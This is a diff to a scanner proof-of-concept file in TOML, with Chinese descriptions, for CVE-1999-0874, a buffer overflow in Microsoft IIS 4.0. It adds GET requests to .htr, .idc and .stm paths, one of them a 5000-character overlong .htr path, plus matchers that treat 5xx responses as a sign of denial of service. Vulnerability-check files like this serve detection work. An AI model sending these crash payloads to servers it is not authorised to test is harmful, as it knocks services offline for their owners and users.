@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "Microsoft IIS 4.0 在处理 .HTR 扩展名的请求时存在远程缓冲区溢出漏洞（CVE-1999-0874）。攻击者可通过发送超长的畸形 .HTR 请求触发缓冲区溢出，导致服务崩溃。本 PoC 通过构造超长 URL 发送请求并检测服务器是否失去响应（拒绝服务）来验证漏洞存在。"
+description = "验证 Microsoft IIS 4.0 在处理 .HTR、.IDC 或 .STM 扩展名请求时存在的缓冲区溢出漏洞。通过向目标发送包含超长畸形字段的 HTTP 请求，观察服务器是否发生拒绝服务（连接重置/无响应），以判断目标是否受 CVE-1999-0874 影响。"
 id = "POC-AVE-1999-1009"
-name = "CVE-1999-0874 Microsoft IIS 4.0 远程缓冲区溢出 PoC"
+name = "CVE-1999-0874 Microsoft IIS 4.0 .HTR/.IDC/.STM 缓冲区溢出 PoC"
 severity = "critical"
 tags = ["ave-1999-1009"]
 vuln_id = [
@@ -11,12 +11,82 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.htr"
+path = "/{{BaseURL}}/default.htr"
 protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = '/{{BaseURL}}/AAAA{{repeat("A", 5000)}}.htr'
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/default.idc"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/default.stm"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
 
 [poc.requests.headers]
 User-Agent = "AVE/1.0"
